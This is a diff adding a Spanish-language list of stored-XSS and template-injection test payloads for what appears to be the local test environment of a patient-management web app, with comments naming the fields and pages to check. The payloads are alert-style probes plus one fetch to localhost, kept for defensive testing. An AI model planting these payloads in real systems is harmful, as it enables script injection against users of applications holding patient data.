@@ -1,0 +1,24 @@
+# Payloads para pruebas de XSS almacenado en el entorno local.
+# Usar SOLO con datos sinteticos. El marcador XSS-SOS facilita la busqueda.
+#
+# Campos sugeridos: nombre, apellido, email, diagnosticoFinal, tratamiento,
+# detalle de auditoria, nombre de actividad y enlace de actividad.
+#
+# Al probar, verificar si el valor se ejecuta en:
+#   - pacientes.html
+#   - lista-espera.html
+#   - auditoria.html
+#   - roles.html
+#   - seguimiento.html
+
+<script>alert('XSS-SOS')</script>
+"><img src=x onerror=alert('XSS-SOS')>
+<svg/onload=alert('XSS-SOS')>
+<iframe src="javascript:alert('XSS-SOS')"></iframe>
+<body onload=alert('XSS-SOS')>
+javascript:alert('XSS-SOS')
+'-alert('XSS-SOS')-'
+</script><script>alert('XSS-SOS')</script>
+<img src=x onerror="fetch('http://localhost:8025/xss')">
+{{7*7}}
+${7*7}
